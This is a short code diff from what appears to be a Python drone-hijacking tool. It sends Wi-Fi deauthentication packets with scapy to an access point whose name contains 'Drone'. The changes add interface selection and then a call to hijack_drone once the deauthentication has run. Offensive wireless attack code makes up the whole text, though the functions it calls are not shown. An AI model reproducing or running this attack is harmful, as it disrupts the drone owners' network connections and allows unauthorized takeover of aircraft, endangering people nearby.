@@ -14,9 +14,8 @@ class Deauth(threading.Thread):
 
     def run(self):
         for item in range(0,20):
-            print("Sending packet->",self.mac)
             scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
-
+        print "Attack complete"
 
 auto_target = 'Drone'
 armed = 0
@@ -104,11 +103,18 @@ def seek_target():
 
 print('Starting target scanning')
 monitor_manage('start')
-interfaces = get_interface() 
+interfaces = get_interface()
+wl = '' 
+for item in interfaces:
+   if 'wlan' in item:
+      wl = item
+      break
+
 targ_id = seek_target()
 Deauth(ap_list[targ_id - 1][0]).start()
-#print(ap_list[targ_id - 1][0])
-
+a = raw_input("Deauthing...hit enter when deauth tips you off")
+monitor_manage('stop')
+hijack_drone(ap_list[targ_id - 1][0],wl)
 
 
 
